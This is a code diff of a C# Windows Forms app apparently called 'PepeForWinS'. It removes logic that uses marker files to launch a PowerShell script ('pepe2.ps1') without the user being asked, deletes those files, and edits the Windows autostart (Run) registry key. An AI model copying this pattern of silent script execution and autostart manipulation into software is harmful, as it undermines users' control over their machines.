@@ -18,51 +18,8 @@ namespace PepeForWinS
         public Form1()
         {
             InitializeComponent();
-            if (File.Exists("textsuka2.txt"))
-            {
-                Form6 fr6 = new Form6();
-                this.Hide();
-                fr6.ShowDialog();
-                this.Show();
-                File.Delete("text.txt");
-                File.Delete("textsuka.txt");
-                File.Delete("textsuka2.txt");
-                /*Удаление из автозапуска*/
-                string progName = "";
-                string run = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
-                Registry.SetValue(run, "Prog", progName);
-            }
-            Fuck();
         }
-        public void Fuck()
-        {
-            if (File.Exists("text.txt"))
-            {
-               Process.Start("pepe2.ps1");
-                using (FileStream fs = File.Create("textsuka.txt"))
-                {
-                    string info = "";
-                    using (var sr = new StreamWriter(fs))
-                    {
-                        sr.Write(info);
-                    }
-                }
-            }
 
-            if (File.Exists("textsuka.txt"))
-            {
-                File.Delete("text.txt");
-                using (FileStream fs1 = File.Create("textsuka2.txt"))
-                {
-                    string info = "";
-                    using (var sr = new StreamWriter(fs1))
-                    {
-                        sr.Write(info);
-                    }
-                }
-
-            }
-        }
         private void Button1_Click(object sender, EventArgs e)
         {
             Form2 fr2 = new Form2();
